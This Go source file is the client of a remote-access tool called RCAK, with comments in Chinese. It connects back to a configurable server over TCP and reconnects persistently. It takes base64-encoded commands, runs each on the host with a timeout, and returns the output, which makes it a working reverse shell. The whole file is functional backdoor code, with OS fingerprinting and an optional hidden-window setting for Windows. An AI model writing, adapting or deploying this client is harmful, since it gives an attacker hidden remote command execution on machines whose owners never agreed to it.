package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"rcak/pkg/util"
	"runtime"
	"strings"
	"syscall"
	"time"

	"github.com/axgle/mahonia"
)

const (
	nconnection = 10 // 允许重连次数
)

var (
	help bool   // 查看帮助
	host string // 连接服务端IP
	port string // 连接服务端端口

	Timeout = 30 * time.Second // cmd执行超时的秒数
	charset = ""               // cmd输出字符串编码
	n       = 1                // 记重连数

)

// init函数是用于程序执行前做包的初始化的函数
func init() {
	flag.BoolVar(&help, "h", false, "help usage")
	flag.StringVar(&host, "H", "127.0.0.1", "server ip default 127.0.0.1")
	flag.StringVar(&port, "p", "20221", "port default 20221")
}

// 加载用户输入的参数
func loadParam() error {
	// 解析参数
	flag.Parse()

	if help {
		// 帮助用法
		usage()
		// 程序正常退出，返回0
		os.Exit(0)
	}
	return nil
}

// 帮助用法函数
func usage() {
	fmt.Fprintf(os.Stderr,
		`RCAK version: 0.0.1
Usage: rcakc [-h] -H <serverIp> -p <serverPort> 
Options:
`)
}

func cmdTimeOut(name string, arg ...string) ([]byte, error) {
	ctxt, cancel := context.WithTimeout(context.Background(), Timeout)
	defer cancel()
	// 通过上下文执行，设置超时
	cmd := exec.CommandContext(ctxt, name, arg...)

	// 兼容windows，windows时使用这个
	// cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	// 兼容linux，linux时使用这个
	cmd.SysProcAttr = &syscall.SysProcAttr{}

	// 标准输出和错误输出到buf值里
	var buf bytes.Buffer
	cmd.Stdout = &buf
	cmd.Stderr = &buf

	// cmd.Start 与 cmd.Wait 必须一起使用

	// cmd.Start 不用等命令执行完成，就结束
	if err := cmd.Start(); err != nil {
		return buf.Bytes(), err
	}

	// cmd.Wait 等待命令结束
	if err := cmd.Wait(); err != nil {
		return buf.Bytes(), err
	}

	return buf.Bytes(), nil
}

// 转化字符串 gbk转utf8
func ConvertToString(src string, srcCode string) string {
	// 原编码gbk
	srcCoder := mahonia.NewDecoder(srcCode)
	// 解码为utf-8
	srcResult := srcCoder.ConvertString(src)
	return srcResult
}

// 连接远程服务器
func connect() {
	conn, err := net.Dial("tcp", host+":"+port)
	if err != nil {
		fmt.Println("Connection...")

		if n == nconnection {
			fmt.Println("Connection fail")
			os.Exit(0)
		}

		for {
			time.Sleep(1 * time.Second)
			n++
			connect()
		}
	}

	// 重置连接次数标记位
	n = 1

	// 连接成功
	fmt.Println("Connection success...")

	for {
		//等待接收指令，以 \n 为结束符，所有指令字符都经过base64
		message, err := bufio.NewReader(conn).ReadString('\n')
		if err == io.EOF {
			// 如果服务器断开，则重新连接
			conn.Close()
			connect()
		}

		// 收到指令base64解码
		command, _ := util.Decode(message)
		// 空格分隔
		cmdlist := strings.Split(command, " ")

		switch cmdlist[0] {
		case "exit":
			conn.Close()
			connect()
		// 获取操作系统
		case "getos":
			if runtime.GOOS == "windows" {
				command = "wmic os get name"
			} else {
				command = "uname -a"
			}
			cmdArray := strings.Split(command, " ")
			cmdSlice := cmdArray[1:]
			// 有超时限制
			out, outerr := cmdTimeOut(cmdArray[0], cmdSlice...)
			if outerr != nil {
				out = []byte(outerr.Error())
			}

			// 解决命令行输出编码问题
			if charset != "utf-8" {
				out = []byte(ConvertToString(string(out), charset))
			}
			// 转换字节码
			os := base64.StdEncoding.EncodeToString([]byte("当前操作系统："))
			encoded := base64.StdEncoding.EncodeToString(out)
			encoded = os + encoded
			conn.Write([]byte(encoded + "\n"))
		default:
			cmdArray := strings.Split(command, " ")
			cmdSlice := cmdArray[1:]

			// out输出结果，outerr错误输出结果
			out, outerr := cmdTimeOut(cmdArray[0], cmdSlice...)
			if outerr != nil {
				out = []byte(outerr.Error())
			}
			// 解决命令行输出编码问题
			if charset != "utf-8" {
				out = []byte(ConvertToString(string(out), charset))
			}

			// 转换字节码
			encoded := base64.StdEncoding.EncodeToString(out)
			conn.Write([]byte(encoded + "\n"))
		}
	}
}

func main() {
	// 读取用户输入的参数
	loadParam()

	// 判断当前操作系统，字符集
	if runtime.GOOS == "windows" {
		charset = "gbk"

	} else if runtime.GOOS == "linux" {
		charset = "utf-8"
	}

	for {
		connect()
	}
}
